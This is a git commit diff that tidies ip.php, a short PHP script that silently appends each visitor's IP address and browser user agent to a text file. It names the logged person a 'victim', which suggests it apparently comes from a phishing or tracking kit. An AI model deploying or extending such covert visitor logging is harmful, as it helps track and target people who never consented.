9a801d5291aef73d0144d6d9493cc619b6376d56
vIPERexe2 <148722243+vIPERexe2@users.noreply.github.com>
2024-05-06 11:50:55 +0300

    Update ip.php

--- ip.php
+++ ip.php
@@ -1,29 +1,24 @@
 <?php
 
-if (!empty($_SERVER['HTTP_CLIENT_IP']))
-    {
-      $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";
-    }
-elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
-    {
-      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
-    }
-else
-    {
-      $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
-    }
+$ipaddress = '';
+
+if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
+    $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
+} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+    $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
+} else {
+    $ipaddress = $_SERVER['REMOTE_ADDR'];
+}
+
 $useragent = " User-Agent: ";
 $browser = $_SERVER['HTTP_USER_AGENT'];
 
-
 $file = 'ip.txt';
 $victim = "IP: ";
+
 $fp = fopen($file, 'a');
 
-fwrite($fp, $victim);
-fwrite($fp, $ipaddress);
-fwrite($fp, $useragent);
-fwrite($fp, $browser);
-
+fwrite($fp, $victim . $ipaddress . "\r\n");
+fwrite($fp, $useragent . $browser . "\r\n");
 
 fclose($fp);
